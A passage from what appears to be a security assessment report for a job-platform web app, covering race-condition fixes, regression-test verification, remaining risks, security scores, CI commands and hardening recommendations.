| Double-spend boost credits by racing | VULN-024 |
| Post jobs bypassing plan limits, as any recruiter | VULN-015 |
| Mark oneself *Selected*, reject rivals | VULN-023 |
| Free unlimited AI usage | VULN-027 |
| Undo another user's account deletion | VULN-009 |
| Trigger mass subscription expiry and job archival | VULN-014 |

### Race Conditions

Three check-then-act sequences on value-bearing state were found and all three now use
compare-and-set updates whose returned row count decides whether the effect is applied:

| Operation | Fix |
|---|---|
| Coupon redemption | `.eq('current_uses', <read value>)` + DB `CHECK` constraint |
| Referral reward | claim the `referral_rewarded` flag first, conditionally |
| Boost credit deduction | `.eq('credits', <read value>)`, with refund on downstream failure |
| Payment entitlement | duplicate check + unique DB index on `payments.payment_id` |

---

## Verification method

Every fix was verified in three ways.

1. **Build and type checking.** `npx tsc --noEmit` → **0 errors**. `npm run build` → success,
   with `ignoreBuildErrors` now set to `false` so type errors can no longer be waved through.

2. **Automated regression tests.** 255 tests across 7 suites, all passing:

   | Suite | Tests | Covers |
   |---|---|---|
   | `tests/api-surface.test.ts` | 148 | Structural: every route is guarded or explicitly allowlisted; high-value routes keep specific guards; cron fails closed; service-role key absent from client code |
   | `tests/route-authorization.test.ts` | 24 | Behavioural: real handlers refuse anonymous callers |
   | `tests/ssrf-guard.test.ts` | 23 | Every blocked address range; metadata endpoint by IP and hostname; scheme allowlist |
   | `tests/input-hardening.test.ts` | 26 | XSS payload neutralisation; PostgREST filter sanitisation; WAF detection |
   | `tests/upload-validation.test.ts` | 15 | Magic-byte enforcement; SVG/HTML rejection; storage-key traversal |
   | `tests/middleware-defenses.test.ts` | 12 | Rate-limit spoofing resistance; WAF; security headers |
   | `tests/payment-integrity.test.ts` | 7 | Signature forgery; plan binding; account binding; capture status; replay |

3. **Negative control — proving the tests are not vacuous.** The fixes to
   `/api/resume/drafts` and `/api/debug-db` were temporarily reverted with `git checkout` and
   the suite re-run. It failed exactly as intended, with the mock reporting
   `SECURITY REGRESSION: database was reached without authentication` on 4 tests. The fixes
   were then restored and all 255 tests passed again. The database mock in
   `route-authorization.test.ts` throws on *any* property access, so a missing guard cannot
   pass silently.

---

## Remaining Risks

| # | Risk | Severity | Why it was not fixed | Recommended action |
|---|---|---|---|---|
| 1 | **Coupon and referral code brute force.** `/api/coupons/validate` and `/api/referral/validate` remain unauthenticated oracles. | Medium | They are needed pre-payment and at signup; authenticating them would break checkout. | Now that rate limiting actually works, add a per-IP failed-attempt lockout and a CAPTCHA after ~5 failures. Ensure coupon codes are long and random rather than guessable words. |
| 2 | **Community per-record ownership.** Write verbs now require a session, but edit/delete do not verify the caller authored the record. | Medium | The 11 community route files use several different author-identity shapes; a correct fix needs the schema confirmed. | Extend `src/lib/authz.ts` with a `getOwnedPost()` helper and apply it to every community edit/delete path. |
| 3 | **RLS is inert for API traffic.** All 108 routes use the service-role key. | Medium | Introducing a request-scoped anon-key client is an architectural change touching every route. | Add a `getSupabaseForUser(token)` client and migrate read paths to it, so RLS becomes a genuine second layer rather than documentation. |
| 4 | **Brevo webhook is a static token, not a body HMAC, with no replay protection** (VULN-038). | Medium | Requires a coordinated change in the Brevo dashboard; a unilateral change breaks live delivery. | Move to HMAC-over-body with a timestamp window and a seen-message-id cache. |
| 5 | **Chat encryption is unauthenticated CBC keyed by the service-role key** (VULN-043). | Medium | Changing the cipher without a data migration would corrupt existing rows. | Set a dedicated `ENCRYPTION_KEY`; add a version prefix; write GCM, read both. |
| 6 | **Session cookie cannot be `HttpOnly`** (VULN-035). | Medium | It is written from JavaScript; `HttpOnly` is impossible client-side. | Add a server route that issues the cookie with `HttpOnly; Secure; SameSite=Lax`. |
| 7 | **Rate limiting is per-process and per-IP only** (VULN-049). | Medium | Needs shared state infrastructure. | Move to Redis or an edge rate limiter; add an account-keyed dimension. |
| 8 | **Verbose error details in ~90 catch blocks** (VULN-042). | Low | A blanket rewrite of every route was higher-risk than the finding. | Mechanically route each catch through the existing `safeErrorResponse()`. |
| 9 | **No malware scanning or archive-bomb limits on uploads.** | Low | Requires an external scanning service. | Integrate ClamAV or a cloud scanner; cap DOCX decompression ratio. |
| 10 | **Dependency vulnerabilities requiring major upgrades** (VULN-041). | Low–Medium | Out of scope per instructions. | Plan a Next 16 migration; re-audit after. |
| 11 | **No `script-src` in the CSP.** | Low | Requires a nonce pipeline; a blind change breaks the app. | Roll out `Content-Security-Policy-Report-Only` with nonces, then enforce. |
| 12 | **Security events are not systematically logged.** | Medium | Needs a logging design decision. | Emit structured events for 401/403, payment verification failures, admin actions and webhook rejections; alert on spikes. |

**This assessment reduces risk; it does not prove the absence of vulnerabilities.** It was a
source review with automated testing, not a live penetration test. Areas that a dynamic
assessment would still need to cover: real session handling against deployed Supabase and
Firebase, actual RLS policy behaviour under multiple concurrent test users, live Razorpay
sandbox flows, and real concurrency against the database rather than mocked clients.

---

## Recommended Future Improvements

1. **Make RLS effective.** Add a request-scoped Supabase client using the anon key plus the
   user's JWT, and migrate read paths to it. Reserve the service-role key for operations that
   genuinely need to cross user boundaries. This turns the existing, well-written policies in
   `migration_enable_rls.sql` into a real second line of defence.
2. **Server-issued session cookie.** A `POST /api/auth/session` route that sets
   `HttpOnly; Secure; SameSite=Lax` closes the XSS-to-session-theft path permanently.
3. **Configure ESLint** with `eslint-config-next` and `eslint-plugin-security`, then set
   `eslint.ignoreDuringBuilds: false` — mirroring what was just done for TypeScript.
4. **Centralise error handling.** Route every catch block through `safeErrorResponse()`.
5. **CSP with nonces.** Generate a per-request nonce in middleware, thread it through the
   document, and roll out `script-src 'self' 'nonce-...'` in Report-Only first.
6. **Structured security logging** with alerting on authorization-failure and
   payment-verification-failure spikes.
7. **Shared-state rate limiting** (Redis or an edge limiter), keyed on both IP and account.
8. **Authenticated encryption** for chat, with a dedicated key and a versioned format.
9. **Delete the dead debug routes** — `debug-db`, `debug-signup-error`, `check-tables`,
   `init-admin`, `admin/payouts`, and the 410 stubs. Code that does not exist cannot regress.
10. **Move the root-level maintenance scripts** (~90 `scratch_*.js`, `test_*.js`, `check_*.js`
    files that connect to the database with production credentials) out of the deployable tree.
11. **Avoid concatenated PostgREST filters in the auth path** — replace the `.or()`
    interpolation in `getAuthenticatedUser` with separate parameterised queries.
12. **Malware scanning** on uploaded documents.
13. **Rotate credentials** if any were ever shared outside the team. Nothing was exposed by this
    assessment, and `.env` has never been committed — but `CRON_SECRET` was effectively public
    (`cron-secret-default`) and should be treated as compromised when you set the real one.

---

## Security Score

Scores reflect the state **after** remediation.

| Domain | Score | Reasoning |
|---|---|---|
| Authentication | **8/10** | Dual-provider token verification is sound; passwords delegated to Supabase/Firebase; no enumeration on reset. Held back by the non-`HttpOnly` cookie and its 7-day lifetime. |
| Authorization | **8/10** | All 108 routes guarded; 50 enforce per-record ownership; shared helpers prevent drift; structural test blocks regressions. Held back by community per-record ownership and inert RLS. |
| API Security | **8/10** | Full surface inventoried and guarded; consistent patterns; validation added on the paths touched. Held back by verbose errors and inconsistent input validation elsewhere. |
| Database Security | **7/10** | No SQL injection; parameterised throughout; integrity constraints added. Held back by service-role usage making RLS inert. |
| Input Validation | **7/10** | WAF screening, PostgREST sanitisation, bounds on the fields touched. Held back by the absence of schema validation (Zod is a dependency but barely used). |
| File Security | **9/10** | Magic-byte verification, allowlists, server-generated keys, SVG rejection, size limits, presigned access. Held back only by the lack of malware scanning. |
| Payment Security | **9/10** | Signature verified, order re-read and bound to plan and account, capture status checked, replay blocked in code and schema, coupons atomic. Held back by PayPal remaining a partial implementation. |
| Infrastructure Security | **7/10** | Good headers, pinned CORS, HSTS, type checking restored. Held back by the missing `script-src` and per-process rate limiting. |
| Dependency Security | **6/10** | 100 → 71; the SSRF-relevant `axios` upgraded. Held back by 2 critical and 12 high findings that need major upgrades. |
| Monitoring | **4/10** | Errors are logged and secrets are not. But there is no structured security event stream, no alerting, and no audit trail for admin actions. The weakest domain. |

### **Overall Security Score: 73/100**

For context, the same scoring applied before remediation would have been roughly **31/100**,
with Authorization at 2/10 and Payment Security at 3/10.

### Vulnerability counts

| Severity | Found | Fixed | Remaining |
|---|---|---|---|
| **Critical** | **16** | **16** | **0** |
| **High** | **18** | **18** | **0** |
| **Medium** | **11** | **10** | **1** |
| **Low / Informational** | **6** | **3** | **3** |
| **Total** | **51** | **47** | **4** |

---

## Commands to run in CI/CD

```bash
# 1. Install with the lockfile respected
npm ci

# 2. Type checking — now enforced at build time
npm run typecheck

# 3. Security regression suite (255 tests) — must be green before deploy
npm run test:security

# 4. Production build
npm run build

# 5. Dependency audit. Fail the pipeline on high or critical in production deps.
npm audit --omit=dev --audit-level=high

# 6. Secret scanning (recommended addition)
npx gitleaks detect --source . --no-git --redact

# 7. Static analysis (recommended addition, once ESLint is configured)
npx semgrep --config=p/typescript --config=p/owasp-top-ten --error
```

### One-time actions required before the next deploy

```bash
# Apply the integrity migration — the payment replay guarantee depends on it
psql "$DATABASE_URL" -f migration_security_integrity.sql

# Confirm the unique index was created; a failure means duplicate payment_id rows exist
psql "$DATABASE_URL" -c "\di payments_payment_id_unique"
```

Set these environment variables. **The first two are now required — code that previously
fell back to an insecure default now fails closed:**

| Variable | Why |
|---|---|
| `CRON_SECRET` | Required. `/api/subscription/cron` returns 401 without it. Use ≥32 random bytes. |
| `PAYPAL_CLIENT_SECRET` | Required for PayPal. Without it, PayPal payments are now rejected rather than accepted unverified. |
| `ENCRYPTION_KEY` | Recommended. Stops the service-role key doubling as the chat encryption key. |
| `TRUSTED_PROXY_HOPS` | Optional, defaults to `1`. Set to `2` if a CDN sits in front of the load balancer. |
| `ALLOW_UNVERIFIED_PAYPAL_IN_DEV` | Local development only. **Never set in any deployed environment.** |

---

## Production hardening recommendations

1. **Apply `migration_security_integrity.sql` before the next deploy.** The payment replay
   protection has an application-level check and a database-level guarantee; without the
   migration only the former is active, and it can lose a race.
2. **Set `CRON_SECRET` immediately.** Treat `cron-secret-default` as compromised — it was the
   effective live value.
3. **Verify `TRUSTED_PROXY_HOPS` matches your actual topology.** Too low and rate limits key on
   a spoofable value again; too high and every client collapses into one bucket. Confirm by
   logging a real `X-Forwarded-For` from production once.
4. **Set `NODE_ENV=production` explicitly** in the deployment environment. Several code paths
   still branch on it.
5. **Delete the ~90 root-level maintenance scripts** from the deployable tree. They connect to
   the database with production credentials and have no business being deployable.
6. **Turn on Supabase Auth rate limiting and leaked-password protection** in the Supabase
   dashboard — application-level limits do not cover flows that go directly to Supabase from
   the browser.
7. **Restrict the R2 bucket** to presigned access only; confirm no public bucket policy.
8. **Rotate the Razorpay, Brevo, Groq, Resend and R2 credentials** on your normal schedule, and
   confirm the Supabase service-role key has never been exposed client-side — the automated
   test now enforces that it is not.
9. **Enable Supabase point-in-time recovery.** Several of the fixed defects were destructive
   (resume deletion, skills wipe, account restore); backups are the compensating control for
   anything already exploited.
10. **Monitor for exploitation of the fixed issues.** Query `payments` for duplicate
    `payment_id` values, coupons where `current_uses > max_uses`, jobs whose `recruiter_pk`
    does not match the posting account's history, and `jobseekers` rows with an unexpected
    `referred_by`. If any of these endpoints were reachable in production, they may already
    have been used.
11. **Add a WAF or DDoS layer in front of the application** (Cloudflare or your platform's
    equivalent). The in-process middleware limiter cannot survive a distributed attack.
12. **Schedule a live penetration test against staging.** This assessment was source-based;
    a dynamic test against a running deployment with real test accounts across all four roles
    is the necessary complement.

---

*Security testing reduces risk. It cannot prove that no vulnerabilities exist. This assessment
covered the code as it stood on 2026-09-07 and did not include live testing of a deployed
environment, infrastructure configuration, or the Supabase and Cloudflare consoles.*
